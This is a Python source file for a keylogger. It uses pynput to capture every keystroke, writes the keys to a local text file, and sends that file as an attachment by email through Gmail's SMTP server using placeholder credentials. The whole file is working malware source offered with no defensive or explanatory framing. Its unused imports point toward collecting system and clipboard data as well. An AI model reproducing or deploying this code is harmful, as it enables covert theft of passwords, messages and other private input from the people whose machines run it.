from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
#import win32clipboard
from pynput.keyboard import Key,Listener
import time
import os
import getpass
from requests import get


keys_information="key_logger.txt"
file_path="D:\\python\\sip"
extend="\\"

email_address="your mail"
passs="security code"
toaddr="your mail"
def send_email(filename,attachment,toaddr):
    fromaddr= email_address
    msg= MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment = open(attachment,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment: filename= %s" % filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,passs)
    text=msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()


count =0 
keys=[]
def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count +=1
    if count >=1:
        count =0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path + extend + keys_information,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()
                
def on_release(key):
    if key== Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

send_email(keys_information,file_path + extend + keys_information,toaddr)